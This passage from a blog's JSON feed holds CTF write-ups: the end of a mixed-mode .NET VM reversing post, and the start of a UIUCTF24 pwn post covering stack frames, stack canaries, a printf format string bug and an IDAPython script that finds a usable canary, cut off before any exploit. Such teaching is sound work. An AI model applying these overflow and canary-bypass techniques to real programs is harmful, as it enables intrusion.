class=\"line\">\t<span class=\"type\">uint8_t</span> reg_10;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint16_t</span> wreg_1;</span><br><span class=\"line\">\t<span class=\"type\">uint16_t</span> wreg_2;</span><br><span class=\"line\">\t<span class=\"type\">uint16_t</span> wreg_3;</span><br><span class=\"line\">\t<span class=\"type\">uint16_t</span> wreg_4;</span><br><span class=\"line\">\t<span class=\"type\">uint16_t</span> wreg_5;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> dreg_1;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> dreg_2;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> dreg_3;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> dreg_4;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> dreg_5;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> qreg_1;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> qreg_2;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> qreg_3;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> qreg_4;</span><br><span class=\"line\">\t<span class=\"type\">uint64_t</span> qreg_5;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> pad[<span class=\"number\">4386</span>];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br />\nIt would also be a good idea at this point to rename  <code>unc_mem_buf</code>  to  <code>vm_state</code> .</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-29.png\" alt=\"alt text\" /><br />\nLooks much cleaner now! Let us continue our analysis.</p>\n<p>So considering that this is a VM - we've found the registers and the functions that select them - obviously there should also be ones that set them, right? Analysing the rest of the  <code>func_*_unc</code>  functions, seems like those are it.<br />\nAn additional element in these functions would be the value to &quot;set&quot; the register to, so let's keep a look out for those too.</p>\n<p>After similar analysis as before and some type fixing:</p>\n<ul>\n<li><code>func_3_unc</code>  -&gt;  <code>set_q_register</code></li>\n<li><code>func_6_unc</code>  -&gt;  <code>set_b_register</code></li>\n<li><code>func_7_unc</code>  -&gt;  <code>set_d_register</code></li>\n<li><code>func_8_unc</code>  -&gt;  <code>set_w_register</code></li>\n</ul>\n<p>I've also renamed the &quot;selection&quot; functions in a similar format, i.e,  <code>get_*_register</code></p>\n<p>The entire function looks a lot cleaner and more understandable now. It is a clear cut VM. Let us note some more interesting points from further analysis:</p>\n<ul>\n<li><code>vm_state-&gt;pad[0]</code>  is consistently used in bitwise assignments and comparisons, which indicates it might be some kind of a &quot;flag&quot; register. Let us rename it to  <code>eflags</code>  (x86 standard)</li>\n<li><code>v68</code>  (the return value of the function at  <code>0x7FF7DF221CF0</code> ) seems to be the main control point of the entire VM, indicating it might be the opcode. This means we would need to analyse how that is being generated.</li>\n<li>In the cases that <em>do</em> use the (now)  <code>eflags</code>  register, we can see there is a particular function being called in each one: named  <code>func_9_unc</code> . Usually,  <code>eflags</code>  is only checked in the case of  <code>jmp</code>  instructions.</li>\n<li>There are some yet-to-be defined functions. Upon some inspection, these seem like they are taking a value as an argument, and placing those in a buffer that is part of the  <code>vm_state</code> . These are nothing but memory write/memory read instructions.</li>\n</ul>\n<p>We do not have enough context to fully understand  <code>func_9_unc</code>  yet, so let us switch and look at how that opcode is formed.</p>\n<p>It takes  <code>elem2</code>  and  <code>elem4</code>  from our struct, and passes it to some function defined in C#.</p>\n<p><img data-src=\"/images/post_images/avernos-bi0s-CTF-2025/image-30.png\" alt=\"decrypt block cipher\" /></p>\n<p>So the first param is some  <code>key</code> , and the second is the  <code>ciphertext</code> . Does this mean that each &quot;instruction&quot; (7 byte) is storing the real opcode with the encrypted opcode as well as the key to decrypt it, embedded inside? Let us update the structure with the same.</p>\n<p><code>elem5</code>  and  <code>elem6</code>  in the struct seem to be used as arguments in almost every case in the VM. These might just be the operands for the instruction. Let us change those too.</p>\n<p>Now, for another important function:  <code>0x7FF7DF221540</code> . This is called twice in the entire binary, once in the VM function, and again when deciding which instruction gets executed next in the VM. So let us take a look.</p>\n<p>For the function that calls it ( <code>0x7FF7DF221570</code> ), the 2nd argument passed to it is the global variable at  <code>0x7FF7DF2391B4</code> , which is interestingly incremented after each time the VM function executes, so it might be some kind of program counter.</p>\n<p>That function simply returns a packed form of  <code>elem1</code>  and  <code>elem3</code>  in the structure. This seems to be the control point for determining which instruction among all the instructions are to be executed. This could be some kind of value that indicates the &quot;index&quot; of the instruction present in memory, which indicates the order in which they are to be executed.</p>\n<p>Keeping all this in context, revisiting  <code>func_9_unc</code>  gives us a better idea of its working: it simply calculates the &quot;address&quot; (or in this context, the <em>index</em>) of the next instruction to be executed. It is the VM's  <code>calculate_jmp_address</code>  function.</p>\n<p>With that, we've wrapped up the working of the VM! I will leave the actual <em>reversing</em> of this VM as an exercise to the reader. A quick brief on one of the solution approaches:</p>\n<ul>\n<li>Extract the instructions from memory by debugging</li>\n<li>Write a disassembler</li>\n<li>Analyse the disassembly generated (pretty trivial)</li>\n</ul>\n<h2 id=\"conclusion\"><a class=\"anchor\" href=\"#conclusion\">#</a> Conclusion</h2>\n<p>I wanted this to be a one-of-a-kind challenge, since I had never seen many mixed mode samples in CTFs. I hope it served as kind of an intro to mixed mode analysis as well as reversing. And most of all I hope you guys had fun solving the challenge!</p>\n<p>As always, you can always reach out to me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly94LmNvbS90aGVfbTNjaGFuaWNf\">Twitter/X</span> if you have any doubts/suggestions. üòÉ</p>\n",
            "tags": [
                "Writeup",
                ".NET",
                "Reversing",
                "CTF",
                "Writeup",
                "Mixed-mode"
            ]
        },
        {
            "id": "https://the-m3chanic.github.io/2024/07/07/Writeup-lost-canary-UIUCTF24/",
            "url": "https://the-m3chanic.github.io/2024/07/07/Writeup-lost-canary-UIUCTF24/",
            "title": "Writeup - lost canary - UIUCTF24",
            "date_published": "2024-07-07T22:34:33.000Z",
            "content_html": "<h1 id=\"lost-canary\"><a class=\"anchor\" href=\"#lost-canary\">#</a> lost-canary</h1>\n<h4 id=\"author-spicypete\"><a class=\"anchor\" href=\"#author-spicypete\">#</a> Author: spicypete</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Damn, I lost my canary at one of the train stations. Can you help me find it?</span><br><span class=\"line\"></span><br><span class=\"line\">ncat --ssl lost-canary.chal.uiuc.tf 1337</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Handout:    </span><br><span class=\"line\">ld-2.31.so</span><br><span class=\"line\">lost_canary</span><br><span class=\"line\">Makefile</span><br><span class=\"line\">libc-2.31.so</span><br><span class=\"line\">Dockerfile</span><br></pre></td></tr></table></figure></p>\n<p><strong>tl; dr:</strong></p>\n<ul>\n<li>Reverse to find unique function not containing bad stack canary</li>\n<li>Libc leak using format string vulnerability in printf</li>\n<li>ROP chain to get shell</li>\n</ul>\n<h2 id=\"step-1-initial-analysis\"><a class=\"anchor\" href=\"#step-1-initial-analysis\">#</a> Step 1: Initial Analysis</h2>\n<p>Okay, we have quite an interesting handout for your average RE challenge. Makefile, libc, linker and Dockerfile?</p>\n<p>Oh yeah, this is also a pwn challenge. üòÉ</p>\n<p>I like to get as many ideas/as much information as I can from everything <em>about</em> or surrounding the challenge as I can, as it usually gives me ideas on what to look for when I start the actual analysis process on the binary.</p>\n<p>So, keeping that in mind, let us first inspect the handout files other than the binary itself.</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cat Dockerfile</span><br><span class=\"line\">FROM ubuntu:20.04 as chroot</span><br><span class=\"line\">FROM gcr.io/kctf-docker/challenge@sha256:eb0f8c3b97460335f9820732a42702c2fa368f7d121a671c618b45bbeeadab28</span><br><span class=\"line\"></span><br><span class=\"line\">COPY --from=chroot / /chroot</span><br><span class=\"line\">RUN mkdir -p /chroot/home/user</span><br><span class=\"line\">COPY ./lost_canary /chroot/home/user</span><br><span class=\"line\">COPY ./flag.txt /chroot/</span><br><span class=\"line\"></span><br><span class=\"line\">COPY nsjail.cfg /home/user/</span><br><span class=\"line\"></span><br><span class=\"line\">CMD kctf_setup &amp;&amp; \\</span><br><span class=\"line\">   kctf_drop_privs \\</span><br><span class=\"line\">  socat \\</span><br><span class=\"line\">     TCP-LISTEN:1337,reuseaddr,fork \\</span><br><span class=\"line\">     EXEC:&quot;kctf_pow nsjail --config /home/user/nsjail.cfg -- /home/user/lost_canary&quot;</span><br></pre></td></tr></table></figure></p>\n<p>Okay, this tells us there is a flag.txt file in the server, which gives us multiple methods of approaching this challenge already. We can narrow down this funnel as we further progress with the challenge, finalising on one approach in the end.</p>\n<p>Next up, let us look at the Makefile<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cat Makefile</span><br><span class=\"line\">main:</span><br><span class=\"line\">        python3 gen-canary.py</span><br><span class=\"line\">        gcc -O0 program.c -std=gnu99 -fno-stack-protector -Wno-deprecated-declarations -o lost_canary</span><br></pre></td></tr></table></figure></p>\n<p>What we see aligns with the name of the challenge as well. We can see that the challenge binary was compiled with the  <code>-fno-stack-protector</code>  option, what does that do?</p>\n<p>Well, before we discuss that I think a small refresher on the stack would be nice.</p>\n<h3 id=\"a-stack-refresher\"><a class=\"anchor\" href=\"#a-stack-refresher\">#</a> A Stack Refresher</h3>\n<p>(I will be using  <code>x86_64</code>  as an example to explain)</p>\n<p>The stack is used to store local variables (on a per-function basis) during program runtime.</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image.png\" alt=\"alt text\" /></p>\n<p>It is also important to clarify the difference between 2 terms: &quot;stack space&quot; and &quot;stack frame&quot;.</p>\n<p>Stack space is the space allocated by your OS for your current program, there is one stack space assigned per program, which is some amount of space in the RAM.</p>\n<p>Stack frame is the &quot;stack&quot; structure itself which is used up per-function in your program - each function has its own stack frame.<br />\nStack frames are constructed and destructed for every function that executes, and there can only be ONE stack frame in the current context at any given time. That means, only one stack pointer ( <code>rsp</code>  in x86-64), which points to the top of the stack - whichever is in the current context, and one base pointer ( <code>rbp</code>  in x86-64), which points to the base of the stack in the current context.</p>\n<p>So, if each function needs to have its own frame, we need a way to save each function's base and top pointers, right?</p>\n<p>First, let us look at how a normal stack looks for a regular function (say  <code>main()</code> )</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-2.png\" alt=\"alt text\" /></p>\n<p>(In actuality, the stack grows <em>downwards</em> in memory, i.e, the stack pointer is the one moving down when the base pointer stays constant above it, but I am just drawing it this way for easier visualisation)</p>\n<p>Okay, now we need to see how each function can maintain it's own stack frame while the overall program still uses only 2 pointers - one for the current stack top and another for the current stack base.</p>\n<p>Let us see how  <code>x86-64</code>  handles this.</p>\n<p>(I am assuming at least basic assembly knowledge at the time of writing this)</p>\n<p>Okay, let us say we are in main, with source code as follows:</p>\n<p><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span> </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> x = <span class=\"number\">5</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> y = <span class=\"number\">7</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Assume find_sum() is defined somewhere in the program */</span></span><br><span class=\"line\">    find_sum(x, y);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>At the line of the call to  <code>find_sum()</code> , the stack would have some values (these depend on the compiler you are using, but not of our concern anyways - what we are bothered with is the top and base pointers). Let us see the stack right <em>before</em> the call to  <code>find_sum()</code> :</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-3.png\" alt=\"alt text\" /></p>\n<p>(<strong>Note</strong>: The  <code>rsp</code>  and  <code>rbp</code>  only <em>point</em> to the top and bottom, they do not contain the values at the bottom/top of the stack - those can be gotten by dereferencing these pointers)</p>\n<p>So, the next line is our function call, let us see what happens.</p>\n<p>First off, every function call is translated into assembly as a  <code>call</code>  instruction, which transfers control flow to a different part of the code.</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># something like this</span><br><span class=\"line\">mov rdi, 5</span><br><span class=\"line\">mov rsi, 7</span><br><span class=\"line\">call find_sum</span><br><span class=\"line\"></span><br><span class=\"line\"># remaining instructions in the program </span><br><span class=\"line\">mov eax, 0</span><br><span class=\"line\">leave </span><br><span class=\"line\">ret</span><br></pre></td></tr></table></figure></p>\n<p>We can see that there are also instructions after the call instruction, so once the different part of the code finishes executing, control flow would need to return to the next instruction ( <code>mov eax, 0</code> , in our case).</p>\n<p>Luckily for us, we have a register which tracks the address of the next instruction:  <code>rip</code> . Let us use that.</p>\n<p>To store  <code>rip</code>  temporarily, we can push it onto the stack.</p>\n<p>The  <code>call</code>  instruction in  <code>x86-64</code>  is actuall abstracted into 2 separate instructions:  <code>push rip</code>  and  <code>jmp rip</code> , so the control flow of our program is transferred there.</p>\n<p>Currently, our stack looks like this:</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-4.png\" alt=\"alt text\" /></p>\n<p>Now, what Intel does here is interesting.</p>\n<p>First, the old <em>value</em> of  <code>rbp</code>  is pushed onto the stack</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-5.png\" alt=\"alt text\" /></p>\n<p>Now that the old  <code>rbp</code>  value is safe, the current top, is set as the new base (i.e,  <code>rsp</code>  and  <code>rbp</code>  now contain the same values, effectively pointing to the same address).</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-7.png\" alt=\"alt text\" /><br />\nAnd now, the stack for the new function is set up! The function is free to use its frame however it pleases (as long as it does not use up all the stack space allocated by the OS!).</p>\n<p>If we had to put what I just showed in pictures and translate it to assembly, it would look a little something like this:</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># save the old value of rbp on the stack</span><br><span class=\"line\">push rbp </span><br><span class=\"line\"></span><br><span class=\"line\"># rbp = rsp, effectively setting the new &quot;base&quot; to the previous &quot;top&quot;</span><br><span class=\"line\">mov rbp, rsp</span><br></pre></td></tr></table></figure></p>\n<p>Now, logically, returning from a function would follow the opposite steps as setting up a stack frame for a function.</p>\n<p>First, the stack top pointer is brought down to the current base (opposite of what happened for setting up)</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-8.png\" alt=\"alt text\" /></p>\n<p>Next, the top value on the stack (which was the old base pointer) is popped into  <code>rbp</code> . This effectively moves the base pointer back to where it previously was.</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-9.png\" alt=\"alt text\" /></p>\n<p>Next, the top value on the stack (which was the old value of  <code>rip</code> ), is popped into  <code>rip</code>  (this is abstracted as the instruction:  <code>ret</code> ).</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-10.png\" alt=\"alt text\" /></p>\n<p>And that's how it's done!</p>\n<p>This is how you can use just 2 pointers to effectively have however many stack frames you want (1 per function).</p>\n<p>Now, back to the challenge üòÉ</p>\n<h2 id=\"analysis-continued\"><a class=\"anchor\" href=\"#analysis-continued\">#</a> Analysis: continued</h2>\n<p>The  <code>-fno-stack-protector</code>  turns off the option to add a stack protection mechanism known as the &quot;stack cookie&quot; or the &quot;stack canary&quot;. Why does the stack need protection, though?</p>\n<p>Well, we have seen that, during a function call, the stack stores 2 critical values: the old base pointer ( <code>rbp</code> ) and the return address from where code flow needs to continue after the function call ( <code>rip</code> ). What if I can overwrite these values?</p>\n<p>What if there are some library functions (for example:  <code>gets</code> ), which use the stack as a buffer to store the value we give it, but do not perform any bound/size checks, and will accept any length of input and place it as it is on the stack?  <code>gets</code>  is one such example of a library function which does not care about the size of the input you give it, it will eat up as many characters as you give it.</p>\n<p>This effectively means I can overwrite the  <code>rip</code>  with whatever value I want, meaning I control the flow of execution of the program going forward.</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-11.png\" alt=\"alt text\" /></p>\n<p>A stack canary is a kind of boundary wall that is used to prevent such attacks. It is a random value that is generated each time the program is run, and placed between the old  <code>rbp</code>  and any value(s) the function uses the stack for storing. So the new stack looks a little something like this:</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-12.png\" alt=\"alt text\" /></p>\n<p>The value of this canary is checked to see if it it was overwritten with something else. If it is not what it's supposed to be, the program simply exits. It is difficult (but not impossible in some cases), to beat this.</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-13.png\" alt=\"alt text\" /></p>\n<p>Next up,  <code>-Wno-deprecated-declarations</code>  - this just tells the compiler to keep quiet and not warn about any deprecated function(s) we might be using in our program.</p>\n<h2 id=\"step-2-program-analysis\"><a class=\"anchor\" href=\"#step-2-program-analysis\">#</a> Step 2: Program Analysis</h2>\n<p>Before we try running the program, we need to make sure the binary is patched to refer to the linker and libc that we have been given in the handout. Luckily, there is a very handy tool for doing just this: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2lvMTIvcHduaW5pdA==\">pwninit</span>.</p>\n<p>Just install and run  <code>pwninit</code>  from the challenge directory and it will do the patching for you, and will generated a separate patched file, with the needed changes.</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-14.png\" alt=\"alt text\" /></p>\n<p>This is what we get from running the binary a couple of times, let us open it up in IDA.</p>\n<p>Immediately, we can see a bunch of  <code>station_&lt;number&gt;</code>  functions, probably the function that gets called based on the station number we input, and it gets there using a  <code>jmp</code>  table. You can tell this because of the  <code>__asm &#123; jmp     rax &#125;</code>  that IDA has placed in the pseudocode. You can recover any jump table in IDA if you notice this by following this <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXgtcmF5cy5jb20vYmxvZy9pZ29ycy10aXAtb2YtdGhlLXdlZWstNTMtbWFudWFsLXN3aXRjaC1pZGlvbXMv\">blog</span>.</p>\n<p>In the  <code>select_station</code>  function itself, we can see there is a call to  <code>printf</code>  with the input that we give to the program. This is a format string vulnerability.</p>\n<h3 id=\"what-is-a-format-string-vulnerability\"><a class=\"anchor\" href=\"#what-is-a-format-string-vulnerability\">#</a> What is a format string vulnerability?</h3>\n<p>In assembly, there is something known as a &quot;calling convention&quot;. This refers to the places where any function looks at first when it is called, to know what arguments were passed to it.</p>\n<p>In  <code>x86-64</code>  the calling convention is as follows:  <code>rdi</code> ,  <code>rsi</code> ,  <code>rdx</code> ,  <code>rcx</code> ,  <code>r8</code> ,  <code>r9</code> . If a function has more arguments than this, the stack is used for the remaining ones.</p>\n<p>This just means that, printf (and all other functions) will look at these registers in these order, followed by the stack to know what it has to print out to the console.</p>\n<p>Now in our program, the printf call is vulnerable because it does not inherently control how many values it prints out. Compare the following 2 printf calls:<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">printf(&quot;%s&quot;, arg);</span><br><span class=\"line\"></span><br><span class=\"line\">printf(arg);</span><br></pre></td></tr></table></figure></p>\n<p>The first one is alright, because there is only 1 format specifier passed when  <code>printf()</code>  is called, and we cannot change that, but the second one is vulnerable - in the sense, we can print out however many values we want, in whatever format we want.</p>\n<p>Before we get to exploiting this format string vulnerability, we also need to identify vulnerable functions, so how do we pick that?</p>\n<h2 id=\"step-3-reversing\"><a class=\"anchor\" href=\"#step-3-reversing\">#</a> Step 3: Reversing</h2>\n<p>A little analysis shows us that there exist 3 different kind of functions, functions that:</p>\n<ol>\n<li>Take ticket code through  <code>gets()</code></li>\n<li>Take ticket code through  <code>fgets()</code> , then use  <code>strcpy()</code>  to copy it elsewhere</li>\n<li>Take ticket code through  <code>scanf()</code></li>\n</ol>\n<p>All 3 have some or the other kind of BOF (buffer overflow) vulnerability, but there is one thing to keep in mind about each function here:</p>\n<ol>\n<li><code>gets()</code>  stops taking input at the first newline ( <code>0xa</code> )</li>\n<li><code>scanf()</code>  stops taking input at the first whitespace character in general</li>\n<li><code>strcpy()</code>  stops at the first null byte</li>\n</ol>\n<p>(I kind of guessed that  <code>gets()</code>  would be the vulnerable function, it as well as could have been any other, in which case my script can be easily modified, but oh well)</p>\n<p>Let us pick a random  <code>gets()</code>  function and examine it.</p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-15.png\" alt=\"alt text\" /></p>\n<p>Seems pretty straightforward, except one thing: a predefined stack canary is being loaded, not by the compiler. Meaning, we have all the stack canary values already, we would not need to spend timing finding/leaking it üòÉ</p>\n<p>Of course, the author would not want things to be this easy, so let us examine the canary as well</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__stack_chk_guard_10 = 0x456B0A4E4C74784F</span><br></pre></td></tr></table></figure></p>\n<p>Ahh, there is a newline in there.</p>\n<p>This is an issue because, if we do end up exploiting the buffer overflow vulnerability in  <code>gets()</code> , we would need to keep the canary intact so as to not have the program detect an overwrite and exit.<br />\nTo do this, we would need to pass the canary as part of the input, and doing that would prematurely end the  <code>gets()</code>  function since there is also a newline in the canary.</p>\n<p>Examining a couple more stations shows us that this is the case for every  <code>gets()</code>  function so far, as well as  <code>scanf()</code>  and  <code>strcpy()</code>  functions</p>\n<p>So, we need to find a single function where this is not the case. For this, we can utilise IDA scripting with the IDAPython API.</p>\n<p>Here is the general idea:</p>\n<ol>\n<li>Generate a list of all functions calling  <code>gets()</code></li>\n<li>Generate a list of all stack canaries without a newline</li>\n<li>Compare to see if there are common functions between the two lists</li>\n</ol>\n<p>So let us write a script to do just that.</p>\n<p><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> idautils</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">find_xrefs_to</span>(<span class=\"params\">address</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    given an address, find all addresses calling that address</span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    xrefs = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ref <span class=\"keyword\">in</span> idautils.CodeRefsTo(address, <span class=\"number\">0</span>):</span><br><span class=\"line\">        xrefs.append(ref)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> xrefs</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_stack_canaries</span>():</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    given the base address, generate a dictionary of in the format </span></span><br><span class=\"line\"><span class=\"string\">    &#123;station_number: canary_value&#125; </span></span><br><span class=\"line\"><span class=\"string\">    if the canary does not contain a newline  </span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    data_addr = <span class=\"number\">0x555555C13010</span></span><br><span class=\"line\">    canaries = []</span><br><span class=\"line\"></span><br><span class=\"line\">    dicky = &#123;&#125;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32767</span>):</span><br><span class=\"line\">        canary = idaapi.get_bytes(i * <span class=\"number\">8</span> + data_addr, <span class=\"number\">8</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">b&quot;\\x0a&quot;</span> <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> (canary):</span><br><span class=\"line\">            dicky[i] = canary</span><br><span class=\"line\">                 </span><br><span class=\"line\">    <span class=\"keyword\">return</span> dicky</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_func_names</span>(<span class=\"params\">xrefs</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    given all addresses calling _gets, </span></span><br><span class=\"line\"><span class=\"string\">    generate a list of all the station numbers </span></span><br><span class=\"line\"><span class=\"string\">    &#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    calling_func_names = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrefs:</span><br><span class=\"line\">        func_name = idaapi.get_func(i)</span><br><span class=\"line\">        func_addr = func_name.start_ea</span><br><span class=\"line\">        calling_func_names.append(func_addr)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> calling_func_names</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"comment\"># address of the label _gets</span></span><br><span class=\"line\">    gets_addr = <span class=\"number\">0x555555555180</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># generate list of all addresses calling _gets</span></span><br><span class=\"line\">    xrefs = find_xrefs_to(gets_addr)</span><br><span class=\"line\">    </span><br><span 